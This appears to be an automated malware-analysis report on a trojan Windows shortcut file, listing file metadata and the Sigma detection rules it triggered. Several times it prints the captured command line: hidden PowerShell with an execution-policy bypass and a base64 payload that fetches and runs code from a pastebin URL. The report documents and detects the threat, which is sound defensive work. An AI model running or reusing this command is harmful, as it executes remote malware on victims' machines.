exiftool.Flags: IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode, ExpIcon, TargetMetadata

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

attributes.magic: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Icon number=325, Archive, ctime=Sat Nov  9 09:43:17 2024, mtime=Sun Dec 14 12:31:21 2025, atime=Sat Nov  9 09:43:17 2024, length=455680, window=hidenormalshowminimized

sigma_analysis_results.rule_description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\System32\WindowsPowerShell\v1.0\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -nop -w 1 -enc aQBlAHgAKABjAHUAcgBsACAAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBjADEAZQBDAFAAWQBZAHkAKQA=; EventID=1; ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\System32\WindowsPowerShell\v1.0\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -nop -w 1 -enc aQBlAHgAKABjAHUAcgBsACAAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBjADEAZQBDAFAAWQBZAHkAKQA=; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

sigma_analysis_results.rule_title: Suspicious Binaries and Scripts in Public Folder
sigma_analysis_results.rule_description: Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.

sigma_analysis_results.rule_title: Windows Shell/Scripting Application File Write to Suspicious Folder
sigma_analysis_results.rule_description: Detects Windows shells and scripting applications that write files to suspicious folders

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\System32\WindowsPowerShell\v1.0\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -nop -w 1 -enc aQBlAHgAKABjAHUAcgBsACAAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBjADEAZQBDAFAAWQBZAHkAKQA=; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64
sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\System32\WindowsPowerShell\v1.0\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -nop -w 1 -enc aQBlAHgAKABjAHUAcgBsACAAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBjADEAZQBDAFAAWQBZAHkAKQA=; EventID=1; ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.
